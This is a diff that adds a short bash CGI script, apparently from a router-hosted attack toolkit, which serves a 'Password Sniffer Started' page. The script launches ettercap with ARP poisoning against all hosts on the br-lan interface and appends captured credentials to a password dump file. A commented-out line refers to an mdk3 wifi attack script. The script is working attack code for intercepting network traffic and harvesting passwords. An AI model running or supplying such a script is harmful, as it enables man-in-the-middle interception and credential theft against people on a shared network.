@@ -1,0 +1,14 @@
+#!/bin/bash
+
+echo "Content-type: text/html"
+echo ""
+
+echo 1 > /www/cgi-bin/sword/network/sniffer/fc.txt
+
+echo "<html><head><title>Password Sniffer Started</title></head>"
+
+ettercap -T -q -i br-lan -M ARP // // >> /www/cgi-bin/sword/network/sniffer/passworddumps.txt &
+
+#/www/cgi-bin/sword/wifi/mdk3/cat.sh
+/www/cgi-bin/sword/network/sniffer/refresh
+echo "</body></html>"
